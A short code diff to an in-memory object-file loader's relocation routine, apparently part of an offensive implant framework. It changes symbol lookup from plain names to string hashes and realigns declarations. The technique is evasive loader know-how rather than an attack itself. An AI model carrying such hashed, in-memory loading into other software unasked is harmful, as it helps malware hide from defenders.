@@ -290,13 +290,14 @@ namespace Memory {
         BOOL BaseRelocation(_executable *object) {
             HEXANE
 
-            _symbol *symbol ={ };
+            _symbol *symbol     = { };
             char symbol_name[9] = { };
-            char *entry_name = { };
-            bool success = true;
+            char *entry_name    = { };
+            bool success        = true;
 
-            uintptr_t offset = 0;
-            uint32_t count = 0;
+            uint32_t hash       = 0;
+            uintptr_t offset    = 0;
+            uint32_t count      = 0;
 
             for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
                 object->section     = P_IMAGE_SECTION_HEADER(object->buffer, i);
@@ -314,10 +315,12 @@ namespace Memory {
                         entry_name = R_CAST(char*, B_PTR(object->symbol) + object->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
                     }
 
+                    hash = Utils::GetHashFromStringA(entry_name, x_strlen(entry_name));
+
                     void *reloc     = object->sec_map[j].address + object->reloc->VirtualAddress;
                     void *sym_sec   = object->sec_map[symbol->SectionNumber - 1].address;
                     void *fn_map    = object->fn_map + sizeof(void*) * count;
-                    void *function  = C_PTR(ResolveSymbol(object, entry_name, symbol->Type));
+                    void *function  = C_PTR(ResolveSymbol(object, hash, symbol->Type));
 
                     switch (function != nullptr) {
 #if _WIN64
